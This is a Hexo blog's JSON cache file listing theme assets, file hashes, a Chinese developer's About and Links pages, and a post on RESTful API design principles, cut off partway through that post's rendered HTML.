{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/hexo-theme-meizi/source/static/css/style.css","path":"static/css/style.css","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.ttf","path":"static/fonts/iconfont.ttf","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.woff","path":"static/fonts/iconfont.woff","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/images/cover.jpg","path":"static/images/cover.jpg","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.eot","path":"static/fonts/iconfont.eot","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/images/gravatar.jpg","path":"static/images/gravatar.jpg","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/images/favicon.png","path":"static/images/favicon.png","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/images/xiamu.png","path":"static/images/xiamu.png","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/images/favicon.jpg","path":"static/images/favicon.jpg","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.svg","path":"static/fonts/iconfont.svg","modified":1,"renderable":1},{"_id":"themes/hexo-theme-meizi/source/static/js/meizi.js","path":"static/js/meizi.js","modified":1,"renderable":1}],"Cache":[{"_id":"themes/hexo-theme-meizi/bower.json","hash":"dedf03e9e405d4be38cebaa753fe23158e32b066","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/_config.yml","hash":"2f3da27695f065db80cc104f86e204fcc4f738f0","modified":1476343874235},{"_id":"themes/hexo-theme-meizi/.gitignore","hash":"5163f3d9e05f8be9025633bac924c47c777b41e6","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/gulpfile.js","hash":"805dbc9e619c0e4be563a8a32b39060fb7475655","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/package.json","hash":"4a88f9f1450747b0b1c13d1f2500ef63a2383de8","modified":1476150848326},{"_id":"source/_posts/RESTful API 设计指北.md","hash":"c658f67b8084957d01752b291231c0ee8a7b4766","modified":1482744105098},{"_id":"source/_posts/JWT 与 OAuth 2.0.md","hash":"b483b80ef5462756ec3463063ee80c2ef85102ea","modified":1476421967231},{"_id":"source/_posts/RESTful 设计大纲.dat","hash":"04c4bca4f3554e360cb8af25161e29d92fac7149","modified":1482744090949},{"_id":"source/_posts/chromeBox 大纲.dat","hash":"26d44ea5427717e9a087f0fb0e1c761b9ce8ce9a","modified":1481794161846},{"_id":"source/about/index.md","hash":"676581e1475f2ff4bd724ff63e4f6ef3a044acf8","modified":1477040992474},{"_id":"source/archive/index.md","hash":"fc18302dc4b2a347ac7969bab93eda360f3b7bd3","modified":1476151223272},{"_id":"source/tags/index.md","hash":"35867ca3284afb0c225bd922f41386fd8b21d8e8","modified":1476151234018},{"_id":"source/_posts/RESTful缓存方案.md","hash":"b30dd6df21d9ab9eee31dc871cabeb874b7118f7","modified":1480990631225},{"_id":"source/_posts/tpshop代码审计.md","hash":"c6b836d318b4d08b294f94135262b27946d7959b","modified":1476668804959},{"_id":"source/links/index.md","hash":"49e30f19d6276ac9f7ddd5956d05c854ae37d99a","modified":1476151170188},{"_id":"themes/hexo-theme-meizi/.git/config","hash":"1c5d5c19a26ebf5e252382d87d71de061d3cf149","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1476150837665},{"_id":"source/_posts/Api安全研究.md","hash":"d4ea08bf1fb8f2947a5b7a90866cf948b625dc8e","modified":1477365876081},{"_id":"themes/hexo-theme-meizi/layout/about.ejs","hash":"4323c21b553780269f2cac5d6e5a8f33d6243290","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/layout/all-archives.ejs","hash":"c97be36b33bb44957778587f00c978f2d28016f8","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/layout/index.ejs","hash":"b0d62a2f93de7917e67556f30dee33214d9b7d74","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/.git/packed-refs","hash":"f1912cd5fdf10c595f5c0416d8d347c60054903a","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/links.ejs","hash":"1514d633dae3c5c5a76344afeaa0fbdf154c025c","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/layout/post.ejs","hash":"c1fe38aba639c318ba79eecab914c18c8272c818","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/layout/tags.ejs","hash":"17a1f47a1b54624645fcb182d4e275512e918386","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/languages/zh-cn.yml","hash":"60767afef61e4ce6809071fccdc4e833b06863eb","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/README.md","hash":"bd5f1ef099ca4f621c29f319165c6470b0cb7014","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/logs/HEAD","hash":"6ad4a377699b78094b84999a7e97fb76dfb6b7aa","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/about.ejs","hash":"a08ffc6ab76217d05facb9cc2b4fcc7ae5148a3e","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/.git/index","hash":"7dd04e6901cb2339c5088455ca12b6e872449c64","modified":1478486845947},{"_id":"themes/hexo-theme-meizi/layout/_partial/links.ejs","hash":"f70a0579a35f2815b919080ae643574e7156e59d","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/layout/_partial/post.ejs","hash":"a9cc56d5d8cf125bd6526eecaa37c26820c3a310","modified":1476324556180},{"_id":"themes/hexo-theme-meizi/layout/_partial/tags.ejs","hash":"b5121bf77d8da66cdb18c1d6269854951fd1c0e5","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/layout/_partial/index.ejs","hash":"3d0bd9cc0b5f1660d74c63166c62155e76c92102","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/source/_css/style.scss","hash":"3b7fd5a263afc20c60557326827c5bd0bfc75de8","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_fonts/iconfont.eot","hash":"c9001a15f52f2ae4395a6664227bec3606de208b","modified":1476150848326},{"_id":"source/_posts/tpshop代码审计--续.md","hash":"a364ec4317bbbf9bd2e355726344e0d9335de13c","modified":1476694639589},{"_id":"themes/hexo-theme-meizi/source/_fonts/iconfont.woff","hash":"7dedf8e171f75fa8acaded22d137dff38be8a2e5","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_fonts/iconfont.svg","hash":"8fa4543f0ebfe580d19be28fbe8b2893c4225140","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_images/favicon.jpg","hash":"b58fc61a225c7d6c08917b77b76152242725d897","modified":1476328003180},{"_id":"themes/hexo-theme-meizi/source/_fonts/iconfont.ttf","hash":"145632363f2b5c5b94bf4e9edaaf09526c829681","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_images/cover.jpg","hash":"ef8a3401e0262f51c2da08d3eca17789c520b8c3","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_images/xiamu.png","hash":"c821bc09e33096325d0913d19fd9c08910e33dd9","modified":1476327869749},{"_id":"themes/hexo-theme-meizi/source/_images/favicon.png","hash":"3d6e9a9968a1c040977337acf095594112630c68","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/scripts/helpers/func.js","hash":"9deec4d350f6baffae85f44c91097139c3fefe46","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_js/meizi.js","hash":"e8e2709c6202af825f28a1fc413922c7297dd160","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1476150837665},{"_id":"themes/hexo-theme-meizi/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/hooks/pre-push.sample","hash":"5c8518bfd1d1d3d2c1a7194994c0a16d8a313a41","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/layout/_partial/archive.ejs","hash":"8126fd297918132825fe3110f5ebb0efe2b9d024","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/source/_images/gravatar.jpg","hash":"4f099782bbfd659255ae4299a101872df01c035b","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1476150837665},{"_id":"themes/hexo-theme-meizi/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/hooks/pre-rebase.sample","hash":"5885a56ab4fca8075a05a562d005e922cde9853b","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/hooks/update.sample","hash":"e729cd61b27c128951d139de8e7c63d1a3758dde","modified":1476150837696},{"_id":"themes/hexo-theme-meizi/.git/refs/heads/master","hash":"9e0459116ecb93cf28843d634c4f246e721004fd","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/duoshuo.ejs","hash":"fa58511057fb387b59771193b1d7eebfe9273c59","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/footer.ejs","hash":"fa6d3667d0bebd00475fd67c1426cd30c80e8ed3","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/disqus.ejs","hash":"e6658fa854c46077b797289599fb1158a05d47dd","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/head.ejs","hash":"7a463f03d7fa36e44750f63ccf51ecf52bfde3c3","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/header.ejs","hash":"f27ad620e4d3b036ede31a5068066581e0d35532","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/pagination.ejs","hash":"244782d6b1fdc6bd71517709a0407272a33c7919","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/scripts.ejs","hash":"c3138803ca03ea4b94aa620b626f1d9cfe477bb2","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/layout/_partial/include/sidebar.ejs","hash":"4ecc51d5c94ab12dab9c8516bb8bfcd720482fa1","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/source/_css/include/_header.scss","hash":"30643e4b7b2fc920c3474ab79936afd619e521ac","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/include/_main.scss","hash":"f89d6f8c0225f60d958deb88c239ce2ba97528bb","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/include/_layout.scss","hash":"313456db88a9ffef298bce6f5041456b98f3f2a6","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/include/_markdown.scss","hash":"2ee28dada07096cf1537652e3105d8e9216c88d3","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/mixins/_query.scss","hash":"b0c46b67d87e7548ccf0704bb43363f2cc6278bd","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/include/_core.scss","hash":"cc72e8ef196ada45f663ab94f0b5862bf0f60f43","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/include/_iconfont.scss","hash":"7de2c0a7dc1ae4f16eb2da1a4fdddd9a0a4acd74","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/include/_sidebar.scss","hash":"d9a9cd8d52ed2d8e3b23074f1c1e7f9b179eaaf4","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/css/style.css","hash":"0e6cd3bd9e5d2ccea03fbf7c255e9b2ad83521f6","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.ttf","hash":"145632363f2b5c5b94bf4e9edaaf09526c829681","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.woff","hash":"7dedf8e171f75fa8acaded22d137dff38be8a2e5","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/_css/mixins/_variables.scss","hash":"38138cafcc3b702b032bb576fa46815b2f0cff3f","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/images/cover.jpg","hash":"ef8a3401e0262f51c2da08d3eca17789c520b8c3","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.eot","hash":"c9001a15f52f2ae4395a6664227bec3606de208b","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/images/gravatar.jpg","hash":"4f099782bbfd659255ae4299a101872df01c035b","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/images/favicon.png","hash":"3d6e9a9968a1c040977337acf095594112630c68","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/images/xiamu.png","hash":"c821bc09e33096325d0913d19fd9c08910e33dd9","modified":1476327869749},{"_id":"themes/hexo-theme-meizi/.git/objects/pack/pack-c864bf3d1b1a7f1bdf1812b8af26dfa27d80b08f.idx","hash":"ddc8d023560997562e71b97d44a538fb0ed1e1f5","modified":1476150848092},{"_id":"themes/hexo-theme-meizi/source/static/images/favicon.jpg","hash":"b58fc61a225c7d6c08917b77b76152242725d897","modified":1476328003180},{"_id":"themes/hexo-theme-meizi/.git/logs/refs/heads/master","hash":"6ad4a377699b78094b84999a7e97fb76dfb6b7aa","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/source/static/fonts/iconfont.svg","hash":"8fa4543f0ebfe580d19be28fbe8b2893c4225140","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/source/static/js/meizi.js","hash":"c145f5f084597c1c6dc57c0bb4ef7c7ca6f7d2a1","modified":1476150848326},{"_id":"themes/hexo-theme-meizi/.git/logs/refs/remotes/origin/HEAD","hash":"6ad4a377699b78094b84999a7e97fb76dfb6b7aa","modified":1476150848311},{"_id":"themes/hexo-theme-meizi/.git/objects/pack/pack-c864bf3d1b1a7f1bdf1812b8af26dfa27d80b08f.pack","hash":"deb8601f46513acdf5c099767f143977c23340d2","modified":1476150848170},{"_id":"public/atom.xml","hash":"a1b0e8c374c5d3196b9392c9dee2a941ee31179e","modified":1482744125878},{"_id":"public/about/index.html","hash":"425aa3ac2e9893bf36401557dc7a9d74bc853884","modified":1482744125935},{"_id":"public/tags/index.html","hash":"8edd19a133c8ad2db0cfc59cb4c9c7e7cb39fc02","modified":1482744125941},{"_id":"public/archive/index.html","hash":"1599ed9ef8ed8bd38d32268176c71fbd61a175f9","modified":1482744125941},{"_id":"public/links/index.html","hash":"9ab2a0340cce12bb93eb57a85b3ee423dbf6b7e8","modified":1482744125941},{"_id":"public/2016/12/RESTful API 设计指北/index.html","hash":"7771052ac2107f22bd3ca557726cf594de64a4d1","modified":1482744125967},{"_id":"public/2016/10/tpshop代码审计--续/index.html","hash":"6922df7111142e699ff3e9c8ae906900de6a4881","modified":1482744125967},{"_id":"public/2016/10/RESTful缓存方案/index.html","hash":"c7becb2d4dd1068a37ed5ce2f1b961f44e62b2aa","modified":1482744125968},{"_id":"public/archives/index.html","hash":"57610ecccfcf22ece0326c4b7e2228e126ae413d","modified":1482744125969},{"_id":"public/2016/10/Api安全研究/index.html","hash":"e9a728d3abff9bad8692c75b0e466af6238c324f","modified":1482744125969},{"_id":"public/archives/2016/index.html","hash":"57610ecccfcf22ece0326c4b7e2228e126ae413d","modified":1482744125969},{"_id":"public/index.html","hash":"57610ecccfcf22ece0326c4b7e2228e126ae413d","modified":1482744125969},{"_id":"public/archives/2016/10/index.html","hash":"addfba7f9e434aefb8525f7a39b8ee59a1b3a19c","modified":1482744125969},{"_id":"public/2016/10/tpshop代码审计/index.html","hash":"18d8a14a978bb17930c1da3e0a08d0558cc431ef","modified":1482744125969},{"_id":"public/2016/10/JWT 与 OAuth 2.0/index.html","hash":"34a85283987c6dad4f2673468d1a27616b6d2d83","modified":1482744125969},{"_id":"public/archives/2016/12/index.html","hash":"22968d827821987ec6aeb0eab9d93df9cb25a98a","modified":1482744125974},{"_id":"public/static/fonts/iconfont.ttf","hash":"145632363f2b5c5b94bf4e9edaaf09526c829681","modified":1482744125974},{"_id":"public/static/fonts/iconfont.eot","hash":"c9001a15f52f2ae4395a6664227bec3606de208b","modified":1482744125974},{"_id":"public/static/images/gravatar.jpg","hash":"4f099782bbfd659255ae4299a101872df01c035b","modified":1482744125974},{"_id":"public/static/images/cover.jpg","hash":"ef8a3401e0262f51c2da08d3eca17789c520b8c3","modified":1482744125974},{"_id":"public/static/images/favicon.jpg","hash":"b58fc61a225c7d6c08917b77b76152242725d897","modified":1482744125974},{"_id":"public/static/images/xiamu.png","hash":"c821bc09e33096325d0913d19fd9c08910e33dd9","modified":1482744125974},{"_id":"public/static/images/favicon.png","hash":"3d6e9a9968a1c040977337acf095594112630c68","modified":1482744125977},{"_id":"public/static/fonts/iconfont.woff","hash":"7dedf8e171f75fa8acaded22d137dff38be8a2e5","modified":1482744125977},{"_id":"public/static/fonts/iconfont.svg","hash":"8fa4543f0ebfe580d19be28fbe8b2893c4225140","modified":1482744125977},{"_id":"public/static/js/meizi.js","hash":"c145f5f084597c1c6dc57c0bb4ef7c7ca6f7d2a1","modified":1482744125980},{"_id":"public/static/css/style.css","hash":"0e6cd3bd9e5d2ccea03fbf7c255e9b2ad83521f6","modified":1482744125980}],"Category":[],"Data":[],"Page":[{"title":"关于我","layout":"about","_content":"\n<!-- 这里写你的简介 -->\n\n普通程序员,从事PHP开发.试图开启全栈技能树和接触各种语言(python ruby等),但是除了PHP都没有生产环境下经验.面向google编程  \n代码外的生活逃不出游戏/音乐/book(大部分为小说)  现在又加上了写博客   \n\n博客用的Hexo + gihub,主题是https://github.com/imochen/hexo-theme-meizi  \n博客没有名字,或者说 它的名字就是Blog  \n本人 不太会表达,也不会写作,如果有错误,万望指出(这也正是我写博客的主要原因)  \n\nps: favicon与头像出自夏目友人帐.想成为像夏目一样温柔的人.","source":"about/index.md","raw":"title: \"关于我\"\nlayout: \"about\"\n---\n\n<!-- 这里写你的简介 -->\n\n普通程序员,从事PHP开发.试图开启全栈技能树和接触各种语言(python ruby等),但是除了PHP都没有生产环境下经验.面向google编程  \n代码外的生活逃不出游戏/音乐/book(大部分为小说)  现在又加上了写博客   \n\n博客用的Hexo + gihub,主题是https://github.com/imochen/hexo-theme-meizi  \n博客没有名字,或者说 它的名字就是Blog  \n本人 不太会表达,也不会写作,如果有错误,万望指出(这也正是我写博客的主要原因)  \n\nps: favicon与头像出自夏目友人帐.想成为像夏目一样温柔的人.","date":"2016-10-21T09:09:52.474Z","updated":"2016-10-21T09:09:52.474Z","path":"about/index.html","comments":1,"_id":"cix5vkhct00021si4tod0pvf4","content":"<!-- 这里写你的简介 -->\n<p>普通程序员,从事PHP开发.试图开启全栈技能树和接触各种语言(python ruby等),但是除了PHP都没有生产环境下经验.面向google编程<br>代码外的生活逃不出游戏/音乐/book(大部分为小说)  现在又加上了写博客   </p>\n<p>博客用的Hexo + gihub,主题是<a href=\"https://github.com/imochen/hexo-theme-meizi\" target=\"_blank\" rel=\"external\">https://github.com/imochen/hexo-theme-meizi</a><br>博客没有名字,或者说 它的名字就是Blog<br>本人 不太会表达,也不会写作,如果有错误,万望指出(这也正是我写博客的主要原因)  </p>\n<p>ps: favicon与头像出自夏目友人帐.想成为像夏目一样温柔的人.</p>\n","excerpt":"","more":"<!-- 这里写你的简介 -->\n<p>普通程序员,从事PHP开发.试图开启全栈技能树和接触各种语言(python ruby等),但是除了PHP都没有生产环境下经验.面向google编程<br>代码外的生活逃不出游戏/音乐/book(大部分为小说)  现在又加上了写博客   </p>\n<p>博客用的Hexo + gihub,主题是<a href=\"https://github.com/imochen/hexo-theme-meizi\">https://github.com/imochen/hexo-theme-meizi</a><br>博客没有名字,或者说 它的名字就是Blog<br>本人 不太会表达,也不会写作,如果有错误,万望指出(这也正是我写博客的主要原因)  </p>\n<p>ps: favicon与头像出自夏目友人帐.想成为像夏目一样温柔的人.</p>\n"},{"title":"标签","layout":"tags","_content":"","source":"tags/index.md","raw":"title: \"标签\"\nlayout: \"tags\"\n---","date":"2016-10-11T02:00:34.018Z","updated":"2016-10-11T02:00:34.018Z","path":"tags/index.html","comments":1,"_id":"cix5vkhcy00041si4hn9w5pz9","content":"","excerpt":"","more":""},{"title":"归档","layout":"all-archives","_content":"","source":"archive/index.md","raw":"title: \"归档\"\nlayout: \"all-archives\"\n---","date":"2016-10-11T02:00:23.272Z","updated":"2016-10-11T02:00:23.272Z","path":"archive/index.html","comments":1,"_id":"cix5vkhd600061si4b17vp23z","content":"","excerpt":"","more":""},{"title":"友情链接","layout":"links","_content":"\n<!-- 这里写你的友情链接列表 -->\n\n- <i class=\"iconfont icon-https\"></i>[JerryQu 的小站](https://imququ.com/)（万能的屈屈大神）\n这样前面会带一个小锁，标明是 https 的站点","source":"links/index.md","raw":"title: \"友情链接\"\nlayout: \"links\"\n---\n\n<!-- 这里写你的友情链接列表 -->\n\n- <i class=\"iconfont icon-https\"></i>[JerryQu 的小站](https://imququ.com/)（万能的屈屈大神）\n这样前面会带一个小锁，标明是 https 的站点","date":"2016-10-11T01:59:30.188Z","updated":"2016-10-11T01:59:30.188Z","path":"links/index.html","comments":1,"_id":"cix5vkhdb00081si46wncy7km","content":"<!-- 这里写你的友情链接列表 -->\n<ul>\n<li><i class=\"iconfont icon-https\"></i><a href=\"https://imququ.com/\" target=\"_blank\" rel=\"external\">JerryQu 的小站</a>（万能的屈屈大神）<br>这样前面会带一个小锁，标明是 https 的站点</li>\n</ul>\n","excerpt":"","more":"<!-- 这里写你的友情链接列表 -->\n<ul>\n<li><i class=\"iconfont icon-https\"></i><a href=\"https://imququ.com/\">JerryQu 的小站</a>（万能的屈屈大神）<br>这样前面会带一个小锁，标明是 https 的站点</li>\n</ul>\n"}],"Post":[{"title":"RESTful API 设计指北","_content":"\n##首先理解 REST 与 RESTful\n\nREST 是Fielding博士在他的论文[1]中提出的一种新的架构风格,被称作表述性状态移交（Representational State Transfer）架构风格,它成为了现代 Web 架构的基础.[2]\n\n符合 REST 原则的应用程序或设计称做 RESTful.\n\n**RESTful API 设计原则:**\n\n- 1. 无状态\n\n - 通信必须在本质上是无状态的.无状态指的是任意一个Web请求必须完全与其他请求隔离，当客户端提出请求时，请求本身包含了这一请求所需的全部信息,会话状态因此要全部保存在客户端\n\n - *有状态和无状态与请求本身没有多大关联，重要的是状态信息是由请求方还是响应方负责保存*\n\n- 2. 对于web的融入\n\n - 这个API应该能够使用浏览器来进行所有测试,能够方便的使用web功能测试、性能测试等工具进行测试,web类应用也方便将多个RESTful API进行整合应用\n\n- 3. 资源\n\n - 对于资源的抽象，是设计RESTful API的核心内容,资源就是\"Representational State Transfer\"这个词组中被省略的主语\n\n - REST 对于信息的核心抽象是资源.任何能够被命名的信息都能够作为一个资源:一份文档或一张图片、一个与时间相关的服务（例如，“洛杉矶今日的天气”）、一个其他资源的集合、一个非虚拟的对象（例如，人）等等。\n\n- 4. 缓存\n\n - 应当具有良好的缓存机制, HTTP的缓存机制就是个不错的选择\n\n- 5. 低耦合\n\n - REST的几个特征保证了RESTful API的低耦合性, 对于资源（Resource）的抽象、统一接口（Uniform Interface）、超文本驱动（Hypertext Driven）[3]\n\n##RESTful API设计细节\n\n###请求\n\nRESTful 使用HTTP动词操作资源\n\n**常用的HTTP动词有下面四个[4]**\n\n- 1. GET - 用于获取资源信息\n- 2. POST - 用于新建或修改资源\n- 3. PUT - 用于修改资源\n- 4. DELETE - 用于删除资源\n\n**幂等性(Idempotent)**\n\n幂等性是指: 多次请求所得到的结果与一次请求所得到的结果相同. 上方具有幂等性的方法有GET/PUT/DELETE\n\n用一个点赞的示例来说明幂等性 & POST与PUT的区别:\n\n当这个点赞一个人只能点赞一次的时候,应使用PUT方法,这个点赞是具有幂等性的,当一个人可以点赞无数次时,应使用POST方法\n\n*PUT方法的幂等性使我们能更好的处理逻辑*\n\n**常见操作示例**\n\n- GET /user - 获取用户列表\n- GET /user/uid - 获取指定用户\n- GET /user/uid/comments- 获取指定用户的评论\n- POST /user - 新建一个用户\n- PUT /user/uid - 修改指定用户\n- DELETE /user/uid - 删除指定用户\n\n*URL的设计原则:资源不能使用动词、路径不宜过深,二三层即可,过深可以使用参数的方式来代表、永远使用最短的路径*\n\n**不被支持的HTTP动词**\n\n有些情况下会只支持GET&POST方法(HTML的FORM标签method属性),可以在头信息中加入X-HTTP-Method-Override来表示当前的HTTP请求或在请求参数中加入_method来表示当前请求(laravel框架使用的此方法)\n\n###SSL/TLS\n\n条件允许的情况下,永远使用SSL/TLS!\n\n好处不多说了,再说一点: 不要将HTTP重定向到HTTPS,抛出错误就好,因为第一次的 HTTP 请求就有可能被劫持,导致请求无法到达服务器，从而构成 HTTPS 降级劫持\n\n###文档\n\n文档应简单易懂并具有良好的示例,粘贴至浏览器能直接使用\n\n这里推荐使用Postman,一个很好用的chrome应用\n\n###版本号\n\nAPI不会是永远稳定的,版本升级的问题无法避免.\n\n版本号只允许枚举,不允许区间.\n\n关于API的版本号问题,有两种解决方案:\n\n- 1. 放入URL中. 优点是更加直观些\n- 2. 放入Header 信息中.URL更加优雅,api.github.com采用此方法\n\n###排序 & 筛选 & 分页\n\n未完待续......\n\n\n","source":"_posts/RESTful API 设计指北.md","raw":"---\ntitle: RESTful API 设计指北\n---\n\n##首先理解 REST 与 RESTful\n\nREST 是Fielding博士在他的论文[1]中提出的一种新的架构风格,被称作表述性状态移交（Representational State Transfer）架构风格,它成为了现代 Web 架构的基础.[2]\n\n符合 REST 原则的应用程序或设计称做 RESTful.\n\n**RESTful API 设计原则:**\n\n- 1. 无状态\n\n - 通信必须在本质上是无状态的.无状态指的是任意一个Web请求必须完全与其他请求隔离，当客户端提出请求时，请求本身包含了这一请求所需的全部信息,会话状态因此要全部保存在客户端\n\n - *有状态和无状态与请求本身没有多大关联，重要的是状态信息是由请求方还是响应方负责保存*\n\n- 2. 对于web的融入\n\n - 这个API应该能够使用浏览器来进行所有测试,能够方便的使用web功能测试、性能测试等工具进行测试,web类应用也方便将多个RESTful API进行整合应用\n\n- 3. 资源\n\n - 对于资源的抽象，是设计RESTful API的核心内容,资源就是\"Representational State Transfer\"这个词组中被省略的主语\n\n - REST 对于信息的核心抽象是资源.任何能够被命名的信息都能够作为一个资源:一份文档或一张图片、一个与时间相关的服务（例如，“洛杉矶今日的天气”）、一个其他资源的集合、一个非虚拟的对象（例如，人）等等。\n\n- 4. 缓存\n\n - 应当具有良好的缓存机制, HTTP的缓存机制就是个不错的选择\n\n- 5. 低耦合\n\n - REST的几个特征保证了RESTful API的低耦合性, 对于资源（Resource）的抽象、统一接口（Uniform Interface）、超文本驱动（Hypertext Driven）[3]\n\n##RESTful API设计细节\n\n###请求\n\nRESTful 使用HTTP动词操作资源\n\n**常用的HTTP动词有下面四个[4]**\n\n- 1. GET - 用于获取资源信息\n- 2. POST - 用于新建或修改资源\n- 3. PUT - 用于修改资源\n- 4. DELETE - 用于删除资源\n\n**幂等性(Idempotent)**\n\n幂等性是指: 多次请求所得到的结果与一次请求所得到的结果相同. 上方具有幂等性的方法有GET/PUT/DELETE\n\n用一个点赞的示例来说明幂等性 & POST与PUT的区别:\n\n当这个点赞一个人只能点赞一次的时候,应使用PUT方法,这个点赞是具有幂等性的,当一个人可以点赞无数次时,应使用POST方法\n\n*PUT方法的幂等性使我们能更好的处理逻辑*\n\n**常见操作示例**\n\n- GET /user - 获取用户列表\n- GET /user/uid - 获取指定用户\n- GET /user/uid/comments- 获取指定用户的评论\n- POST /user - 新建一个用户\n- PUT /user/uid - 修改指定用户\n- DELETE /user/uid - 删除指定用户\n\n*URL的设计原则:资源不能使用动词、路径不宜过深,二三层即可,过深可以使用参数的方式来代表、永远使用最短的路径*\n\n**不被支持的HTTP动词**\n\n有些情况下会只支持GET&POST方法(HTML的FORM标签method属性),可以在头信息中加入X-HTTP-Method-Override来表示当前的HTTP请求或在请求参数中加入_method来表示当前请求(laravel框架使用的此方法)\n\n###SSL/TLS\n\n条件允许的情况下,永远使用SSL/TLS!\n\n好处不多说了,再说一点: 不要将HTTP重定向到HTTPS,抛出错误就好,因为第一次的 HTTP 请求就有可能被劫持,导致请求无法到达服务器，从而构成 HTTPS 降级劫持\n\n###文档\n\n文档应简单易懂并具有良好的示例,粘贴至浏览器能直接使用\n\n这里推荐使用Postman,一个很好用的chrome应用\n\n###版本号\n\nAPI不会是永远稳定的,版本升级的问题无法避免.\n\n版本号只允许枚举,不允许区间.\n\n关于API的版本号问题,有两种解决方案:\n\n- 1. 放入URL中. 优点是更加直观些\n- 2. 放入Header 信息中.URL更加优雅,api.github.com采用此方法\n\n###排序 & 筛选 & 分页\n\n未完待续......\n\n\n","slug":"RESTful API 设计指北","published":1,"date":"2016-12-26T09:21:24.337Z","updated":"2016-12-26T09:21:45.098Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cix5vkhbc00001si4il2et71r","content":"<p>##首先理解 REST 与 RESTful</p>\n<p>REST 